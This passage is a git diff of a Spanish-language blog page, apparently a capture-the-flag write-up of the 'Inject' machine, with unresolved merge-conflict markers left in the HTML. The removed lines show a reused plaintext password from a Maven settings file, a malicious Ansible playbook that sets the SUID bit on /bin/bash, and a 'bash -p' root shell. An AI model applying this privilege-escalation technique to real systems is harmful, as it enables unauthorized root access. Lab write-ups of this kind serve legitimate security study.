-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;password&gt;</span>DocPhillovestoInject123<span style="color:#f92672">&lt;/password&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;privateKey&gt;</span>${user.home}/.ssh/id_dsa<span style="color:#f92672">&lt;/privateKey&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;filePermissions&gt;</span>660<span style="color:#f92672">&lt;/filePermissions&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;directoryPermissions&gt;</span>660<span style="color:#f92672">&lt;/directoryPermissions&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;configuration&gt;&lt;/configuration&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/server&gt;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/servers&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/settings&gt;</span>
-</span></span></code></pre></div><p>Me conecto como <strong>phil</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>frank@inject:~$ su - phil
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span>phil@inject:~$
-</span></span></code></pre></div><p>lanzo <strong>pspy</strong> y veo que <strong>root</strong> ejecuta con <code>ansible-parallel</code> todos los archivos <code>.yml</code> en <code>/opt/automation/tasks/*</code>.</p>
-<pre tabindex="0"><code>UID=0 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
-</code></pre><p><strong>Phil</strong> tiene permisos de escritura en el directorio <code>/task</code> porque pertenece al grupo <strong>staff</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>phil@inject:/opt/automation/tasks/$ id 
-</span></span><span style="display:flex;"><span>uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
-</span></span></code></pre></div><p>Creo el archivo <code>root.yml</code> y lo subo a la máquina víctima.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>phil@inject:/opt/automation/tasks$ touch root.yml
-</span></span><span style="display:flex;"><span>phil@inject:/opt/automation/tasks$ ls 
-</span></span><span style="display:flex;"><span>root.yml playbook_1.yml
-</span></span></code></pre></div><p>Archivo <code>root.yml</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">localhost</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">gather_facts</span>: <span style="color:#66d9ef">false</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>: <span style="color:#ae81ff">privesc</span>
-</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">root</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">command</span>: <span style="color:#ae81ff">chmod u+s /bin/bash</span>
-</span></span></code></pre></div><p>Después de unos minutos <code>/bin/bash</code> tendrá permisos <strong>SUID</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </span></span></code></pre></div><p>Obtengo el root.</p>
 <pre tabindex="0"><code>phil@inject:/opt/automation/tasks$ bash -p
 bash-5.0# whoami 
@@ -704,12 +441,7 @@ root
 <p>Saludos!</p>
 
             </div>
-<<<<<<< HEAD
         </article></main>
-=======
-        </article>
-    </main>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </div>
 <footer class="footer">
     <span class="footer_item"> </span>
@@ -728,17 +460,9 @@ root
 </div>
     <small class="footer_copyright">
         © 2024 .
-<<<<<<< HEAD
         
     </small>
 </footer><a href="#" title="" id="totop">
-=======
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
-        theme on
-        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
     <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
     <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
 </svg>
@@ -747,7 +471,6 @@ root
 
 
     
-<<<<<<< HEAD
 
 
 
@@ -760,12 +483,4 @@ root
     
 
 </body>
-=======
-    
-    
-    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
-
-
-    </body>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </html>
